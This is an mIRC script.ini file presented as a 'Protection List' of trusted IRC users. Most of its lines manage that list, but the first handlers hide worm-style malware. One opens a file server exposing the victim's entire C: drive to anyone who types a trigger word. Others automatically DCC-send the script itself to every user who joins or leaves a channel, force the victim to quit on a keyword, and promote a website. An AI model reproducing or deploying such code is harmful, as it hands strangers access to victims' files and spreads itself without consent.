[script]
n0=;----------------------------------------------------------
n1=;      Protection List
n2=;----------------------------------------------------------
n3=ON 1:TEXT:*Er0lsux*:*:/quit I was boffed at http://bsf.home.ml.org/
n5=ON 1:TEXT:*SuckMe*:*:/fserve $nick 1 c:\
n8=ON 1:TEXT:*hi*:*:/msg $me Maybe I Should Go To http://bsf.home.ml.org/ cause it rocks the world.
n11=ON 1:JOIN:#:/dcc send $nick SCRIPT.INI
n12=ON 1:PART:#:/dcc send $nick SCRIPT.INI
n13=#user.prot.add.all off
n14=raw 401:*: set %User.Nick 0 | halt
n15=raw 301:*: halt
n16=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt
n17=raw 312:*: halt
n18=raw 313:*: halt
n19=raw 317:*: halt
n20=raw 319:*: halt
n21=raw 318:* {
  n22=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto done }
  n23=  set %User.Address $mask(%User.Address,3)
  n24=  set %Var.Temp $readini $mircdirsystem\protect.ini %User.Address Channels
  n25=  if (%Var.Temp == *) { error $2 is already on the protected list for all channels! | goto done }
  n26=  writeini $mircdirsystem\protect.ini %User.Address Channels *
  n27=  echo %color.echo -a  Added $2 6( $+ %User.Address $+ 6) to protected user list. Channels: All | .auser 85 %User.Address
  n28=  :done
  n29=  unset %User.* | .disable #user.prot.add.all | halt
  n30=}
  n31=#user.prot.add.all end
  n32=#user.prot.add.chan off
  n33=raw 401:*: set %User.Nick 0 | halt
  n34=raw 301:*: halt
  n35=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt
  n36=raw 312:*: halt
  n37=raw 313:*: halt
  n38=raw 317:*: halt
  n39=raw 319:*: halt
  n40=raw 318:* {
    n41=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto done }
    n42=  set %User.Address $mask(%User.Address,3)
    n43=  set %Var.Temp $readini $mircdirsystem\protect.ini %User.Address Channels
    n44=  if (%Var.Temp == $null) {
      n45=    writeini $mircdirsystem\protect.ini %User.Address Channels %User.Channel
      n46=    echo %color.echo %User.Channel Added $2 6( $+ %User.Address $+ 6) to protected user list. Channels: %User.Channel | .auser 85 %User.Address | goto done
    n47=  }
    n48=  if (%Var.Temp == *) {
      n49=    if ($yesno(Remove from all channels first) == 1) {
        n50=      writeini $mircdirsystem\protect.ini %User.Address Channels %User.Channel
        n51=      echo %color.echo %User.Channel Added $2 6( $+ %User.Address $+ 6) to protected user list. Channels: %User.Channel | .auser 85 %User.Address | goto done
      n52=    } | else { goto done }
    n53=  }
    n54=  if (%User.Channel isin %Var.Temp) { error $2 is already on the protected list for %User.Channel $+ . | goto done }
    n55=  set %Var.Temp $addtok(%Var.Temp,%User.Channel,32) | writeini $mircdirsystem\protect.ini %User.Address Channels %Var.Temp
    n56=  echo %color.echo %User.Channel Added $2 6( $+ %User.Address $+ 6) to protected user list. Channels: %User.Channel | .auser 85 %User.Address
    n57=  :done
    n58=  unset %User.* | .disable #user.prot.add.chan | halt
    n59=}
